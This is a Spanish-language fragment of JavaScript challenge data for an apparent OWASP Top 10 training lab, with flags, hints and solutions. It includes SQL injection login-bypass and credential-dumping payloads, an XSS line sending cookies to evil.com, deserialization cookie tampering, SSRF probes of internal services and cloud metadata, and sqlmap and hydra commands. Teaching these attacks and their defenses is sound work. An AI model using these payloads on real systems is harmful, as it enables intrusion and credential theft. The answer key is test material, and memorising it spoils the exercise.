    <script>

                    'UNION injection: <code>\' UNION SELECT null,null--</code>',
                    'Extrae datos: <code>\' UNION SELECT username,password FROM users--</code>'

                code: `<span class="comment"># SQLi en login</span>\n<span class="flag">user: admin'--\npass: anything</span>\n<span class="output">→ Login bypass exitoso</span>\n\n<span class="comment"># SQLi en búsqueda</span>\n<span class="flag">' UNION SELECT username,password FROM users--</span>\n<span class="output">admin:admin123</span>\n<span class="output">user1:user123</span>\n<span class="output">editor:editor456</span>\n\n<span class="comment"># sqlmap</span>\n<span class="command">sqlmap -u "http://localhost:8080/search?id=1" --dbs --batch</span>`,

                flag: 'FLAG{a03_sqli_data_extracted}',

                solution: 'admin\'-- bypassa login. UNION extrae 3 usuarios de la tabla users.'

            {
                title: 'A05 — Security Misconfiguration',
                xp: 50,
                objective: 'Encuentra archivos de configuración expuestos y servicios abiertos.',

                flag: 'FLAG{a05_misconfig_env_exposed}',

                title: 'A07 — Cross-Site Scripting (XSS)',

                    'Bypass filtro: <code>&lt;img src=x onerror=alert(1)&gt;</code>',

                    'Roba cookie: <code>&lt;script&gt;fetch("http://evil.com?c="+document.cookie)&lt;/script&gt;</code>'

                flag: 'FLAG{a07_xss_cookie_theft}',

                title: 'A08 — Insecure Deserialization',
                xp: 50,
                objective: 'Manipula objetos serializados para escalar privilegios.',

                    'Decodifica: <code>echo "Tzo..." | base64 -d</code>',
                    'Modifica el campo role: guest → admin',
                    'Re-codifica y reenvía la cookie'

                code: `<span class="comment"># Cookie original (Base64)</span>\n<span class="output">Tzo0OiJVc2VyIjoxOntzOjg6InVzZXJuYW1lIjtzOjU6ImFkbWluIjtzOjg6InJvbGVfam9iIjtzOjEwOiJndWVzdF91c2VyIn0=</span>\n\n<span class="comment"># Decodificar</span>\n<span class="flag">O:4:"User":1:{s:8:"username";s:5:"admin";s:8:"role_job";s:10:"guest_user";}</span>\n\n<span class="comment"># Modificar role_job</span>\n<span class="flag">O:4:"User":1:{s:8:"username";s:5:"admin";s:8:"role_job";s:10:"admin_user";}</span>\n\n<span class="comment"># Re-codificar en Base64 y usar como cookie</span>`,
                codeLang: 'bash',
                flag: 'FLAG{a08_deserialization_priv_esc}',
                hint: 'El objeto PHP serializado tiene role_job: guest_user. Cámbialo a admin_user.',
                solution: 'Cookie serializada en Base64. role_job: guest_user → admin_user = acceso admin.'
            },

                title: 'A10 — Server-Side Request Forgery (SSRF)',
                xp: 50,
                objective: 'Usa SSRF para escanear puertos internos y acceder a servicios.',
                steps: [
                    'Port scan interno: <code>/fetch?url=http://127.0.0.1:22</code>',
                    'Accede a MySQL: <code>/fetch?url=http://127.0.0.1:3306</code>',
                    'Accede a metadata: <code>/fetch?url=http://169.254.169.254/latest/meta-data/</code>',
                    'Enumera servicios internos'
                ],
                code: `<span class="command">curl "http://localhost:8080/fetch?url=http://127.0.0.1:22"</span>\n<span class="flag">SSH-2.0-OpenSSH_8.4p1 Ubuntu</span>\n\n<span class="command">curl "http://localhost:8080/fetch?url=http://127.0.0.1:3306"</span>\n<span class="flag">5.7.36mysql_native_password</span>\n\n<span class="command">curl "http://localhost:8080/fetch?url=http://127.0.0.1:6379"</span>\n<span class="flag">+PONG (Redis expuesto!)</span>`,
                codeLang: 'bash',
                flag: 'FLAG{a10_ssrf_internal_scan}',

                solution: 'SSRF expone: SSH (22), MySQL (3306), Redis (6379). Redis sin auth = riesgo crítico.'

                    'Identifica el mensaje de error para el filtro',
                    'Documenta credenciales encontradas'

                code: `<span class="command">hydra -l admin -P rockyou.txt localhost http-post-form \\\n  "/login:user=^USER^&pass=^PASS^:Invalid"</span>\n\n<span class="flag">[80][http-post-form] host: localhost   login: admin   password: admin123</span>\n\n<span class="comment"># Con Burp Intruder</span>\n<span class="output">Payload: rockyou.txt</span>\n<span class="output">Filter: Length != 1234 (diferente a "Invalid")</span>\n<span class="flag">→ admin:admin123</span>`,
                codeLang: 'bash',
                flag: 'FLAG{bruteforce_admin_found}',
                hint: 'Filtra por longitud de respuesta diferente al mensaje de error.',
                solution: 'Hydra crackea admin:admin123 en ~30 segundos con rockyou.txt.'
            },

                title: 'Defensa y Hardening',
                xp: 50,
                objective: 'Documenta mitigaciones para cada vulnerabilidad OWASP encontrada.',
                steps: [

                    'A03: Prepared statements y input validation',
                    'A05: Eliminar archivos expuestos, deshabilitar debug',
                    'A07: Content Security Policy y output encoding',
                    'Crea informe con cada hallazgo y remediación'
                ],
                code: `<span class="comment"># Mitigaciones OWASP Top 10</span>\n\n<span class="flag">A01: RBAC + session validation middleware</span>\n<span class="flag">A03: Prepared statements + WAF</span>\n<span class="flag">A05: Remove .env, .git, phpinfo.php</span>\n<span class="flag">A07: CSP headers + output encoding</span>\n<span class="flag">A08: Signed cookies + HMAC validation</span>\n<span class="flag">A10: Whitelist URLs + disable internal access</span>\n\n<span class="comment"># Apache .htaccess</span>\nHeader always set X-Frame-Options "SAMEORIGIN"\nHeader always set Content-Security-Policy "default-src 'self'"`,

                flag: 'FLAG{owasp_hardening_complete}',
                hint: 'Cada vulnerabilidad OWASP tiene una mitigación específica documentada.',
                solution: '6 vulnerabilidades mitigadas con preparación de statements, RBAC, CSP, HMAC y URL whitelist.'
            }
        ]
